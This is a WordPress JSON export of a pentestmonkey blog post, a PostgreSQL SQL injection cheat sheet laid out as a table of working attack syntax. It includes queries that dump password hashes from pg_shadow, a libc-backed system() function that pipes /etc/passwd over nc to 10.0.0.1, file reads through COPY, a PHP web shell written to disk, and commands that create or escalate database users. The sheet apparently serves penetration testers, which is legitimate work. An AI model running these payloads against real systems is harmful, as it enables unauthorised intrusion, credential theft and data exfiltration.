{"id":85,"date":"2007-11-27T20:18:37","date_gmt":"2007-11-27T20:18:37","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=85"},"modified":"2011-11-11T17:35:12","modified_gmt":"2011-11-11T17:35:12","slug":"postgres-sql-injection-cheat-sheet","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/cheat-sheet\/sql-injection\/postgres-sql-injection-cheat-sheet","title":{"rendered":"Postgres SQL Injection Cheat Sheet"},"content":{"rendered":"<p>Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230;<\/p>\n<p><!--more--><\/p>\n<p>This post is part of a series of SQL Injection Cheat Sheets.\u00a0 In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.\u00a0 This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.<\/p>\n<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:<\/p>\n<ul>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/oracle-sql-injection-cheat-sheet\/\">Oracle<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mssql-sql-injection-cheat-sheet\/\">MSSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mysql-sql-injection-cheat-sheet\/\">MySQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/postgres-sql-injection-cheat-sheet\/\">PostgreSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/ingres-sql-injection-cheat-sheet\/\">Ingres<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/db2-sql-injection-cheat-sheet\/\">DB2<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/informix-sql-injection-cheat-sheet\/\">Informix<\/a><\/li>\n<\/ul>\n<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href=\"http:\/\/nibblesec.org\/files\/MSAccessSQLi\/MSAccessSQLi.html\">MS Access Cheat Sheet here<\/a>.<\/p>\n<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.<\/p>\n<table border=\"1\">\n<tbody>\n<tr>\n<td>Version<\/td>\n<td>SELECT version()<\/td>\n<\/tr>\n<tr>\n<td>Comments<\/td>\n<td>SELECT 1; &#8211;comment<br \/>\nSELECT \/*comment*\/1;<\/td>\n<\/tr>\n<tr>\n<td>Current User<\/td>\n<td>SELECT user;<br \/>\nSELECT current_user;<br \/>\nSELECT session_user;<br \/>\nSELECT usename FROM pg_user;<br \/>\nSELECT getpgusername();<\/td>\n<\/tr>\n<tr>\n<td>List Users<\/td>\n<td>SELECT usename FROM pg_user<\/td>\n<\/tr>\n<tr>\n<td>List Password Hashes<\/td>\n<td>SELECT usename, passwd FROM pg_shadow &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Password Cracker<\/td>\n<td><a href=\"http:\/\/pentestmonkey.net\/blog\/cracking-postgres-hashes\/\">MDCrack<\/a> can crack PostgreSQL&#8217;s MD5-based passwords.<\/td>\n<\/tr>\n<tr>\n<td>List Privileges<\/td>\n<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user<\/td>\n<\/tr>\n<tr>\n<td>List DBA Accounts<\/td>\n<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE<\/td>\n<\/tr>\n<tr>\n<td>Current Database<\/td>\n<td>SELECT current_database()<\/td>\n<\/tr>\n<tr>\n<td>List Databases<\/td>\n<td>SELECT datname FROM pg_database<\/td>\n<\/tr>\n<tr>\n<td>List Columns<\/td>\n<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;)<\/td>\n<\/tr>\n<tr>\n<td>List Tables<\/td>\n<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&#8216;r&#8217;,&#8221;) AND n.nspname NOT IN (&#8216;pg_catalog&#8217;, &#8216;pg_toast&#8217;) AND pg_catalog.pg_table_is_visible(c.oid)<\/td>\n<\/tr>\n<tr>\n<td>Find Tables From Column Name<\/td>\n<td>If you want to list all the table names that contain a column LIKE &#8216;%password%&#8217;:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;) AND attname LIKE &#8216;%password%&#8217;;<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Row<\/td>\n<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; &#8212; rows numbered from 0<br \/>\nSELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Char<\/td>\n<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); &#8212; returns c<\/td>\n<\/tr>\n<tr>\n<td>Bitwise AND<\/td>\n<td>SELECT 6 &amp; 2; &#8212; returns 2<br \/>\nSELECT 6 &amp; 1; &#8211;returns 0<\/td>\n<\/tr>\n<tr>\n<td>ASCII Value -&gt; Char<\/td>\n<td>SELECT chr(65);<\/td>\n<\/tr>\n<tr>\n<td>Char -&gt; ASCII Value<\/td>\n<td>SELECT ascii(&#8216;A&#8217;);<\/td>\n<\/tr>\n<tr>\n<td>Casting<\/td>\n<td>SELECT CAST(1 as varchar);<br \/>\nSELECT CAST(&#8216;1&#8217; as int);<\/td>\n<\/tr>\n<tr>\n<td>String Concatenation<\/td>\n<td>SELECT &#8216;A&#8217; || &#8216;B&#8217;; &#8212; returnsAB<\/td>\n<\/tr>\n<tr>\n<td>If Statement<\/td>\n<td>IF statements only seem valid inside functions, so aren&#8217;t much use for SQL injection.\u00a0 See CASE statement instead.<\/td>\n<\/tr>\n<tr>\n<td>Case Statement<\/td>\n<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; &#8212; returns A<\/td>\n<\/tr>\n<tr>\n<td>Avoiding Quotes<\/td>\n<td>SELECT CHR(65)||CHR(66); &#8212; returns AB<\/td>\n<\/tr>\n<tr>\n<td>Time Delay<\/td>\n<td>SELECT pg_sleep(10); &#8212; postgres 8.2+ only<br \/>\nCREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS &#8216;\/lib\/libc.so.6&#8217;, &#8216;sleep&#8217; language &#8216;C&#8217; STRICT; SELECT sleep(10); &#8211;priv, create your own sleep function.\u00a0 Taken from <a href=\"http:\/\/www.portcullis.co.uk\/uplds\/whitepapers\/Having_Fun_With_PostgreSQL.pdf\">here<\/a> .<\/td>\n<\/tr>\n<tr>\n<td>Make DNS Requests<\/td>\n<td>Generally not possible in postgres.\u00a0 However if <a href=\"http:\/\/www.leidecker.info\/pgshell\/Having_Fun_With_PostgreSQL.html\">contrib\/dblink<\/a>is installed (it isn&#8217;t by default) it can be used to resolve hostnames (assuming you have DBA rights):<\/p>\n<pre>SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);<\/pre>\n<p>Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. &#8220;ping pentestmonkey.net&#8221;.<\/td>\n<\/tr>\n<tr>\n<td>Command Execution<\/td>\n<td>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS &#8216;\/lib\/libc.so.6&#8217;, &#8216;system&#8217; LANGUAGE &#8216;C&#8217; STRICT; &#8212; privSELECT system(&#8216;cat \/etc\/passwd | nc 10.0.0.1 8080&#8217;); &#8212; priv, commands run as postgres\/pgsql OS-level user<\/td>\n<\/tr>\n<tr>\n<td>Local File Access<\/td>\n<td>CREATE TABLE mydata(t text);<br \/>\nCOPY mydata FROM &#8216;\/etc\/passwd&#8217;; &#8212; priv, can read files which are readable by postgres OS-level user<br \/>\n&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; &#8212; get data back one row at a time<br \/>\n&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; &#8212; get data back one row at a time &#8230;<br \/>\nDROP TABLE mytest mytest;Write to a file:<\/p>\n<p>CREATE TABLE mytable (mycol text);<br \/>\nINSERT INTO mytable(mycol) VALUES (&#8216;&lt;? pasthru($_GET[cmd]); ?&gt;&#8217;);<br \/>\nCOPY mytable (mycol) TO &#8216;\/tmp\/test.php&#8217;; &#8211;priv, write files as postgres OS-level user.\u00a0 Generally you won&#8217;t be able to write to the web root, but it&#8217;s always work a try.<br \/>\n&#8212; priv user can also read\/write files by <a href=\"http:\/\/www.portcullis.co.uk\/uplds\/whitepapers\/Having_Fun_With_PostgreSQL.pdf\">mapping libc functions<\/a><\/td>\n<\/tr>\n<tr>\n<td>Hostname, IP Address<\/td>\n<td>SELECT inet_server_addr(); &#8212; returns db server IP address (or null if using local connection)<br \/>\nSELECT inet_server_port(); &#8212; returns db server IP address (or null if using local connection)<\/td>\n<\/tr>\n<tr>\n<td>Create Users<\/td>\n<td>CREATE USER test1 PASSWORD &#8216;pass1&#8217;; &#8212; priv<br \/>\nCREATE USER test1 PASSWORD &#8216;pass1&#8217; CREATEUSER; &#8212; priv, grant some privs at the same time<\/td>\n<\/tr>\n<tr>\n<td>Drop Users<\/td>\n<td>DROP USER test1; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Make User DBA<\/td>\n<td>ALTER USER test1 CREATEUSER CREATEDB; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>\u00a0Location of DB files<\/td>\n<td>SELECT current_setting(&#8216;data_directory&#8217;); &#8212; priv<br \/>\nSELECT current_setting(&#8216;hba_file&#8217;); &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Default\/System Databases<\/td>\n<td>template0<br \/>\ntemplate1<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n","protected":false},"excerpt":{"rendered":"<p>Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230;<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[8],"tags":[46,44,19,84,78],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/85"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=85"}],"version-history":[{"count":3,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/85\/revisions"}],"predecessor-version":[{"id":408,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/85\/revisions\/408"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=85"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=85"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=85"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}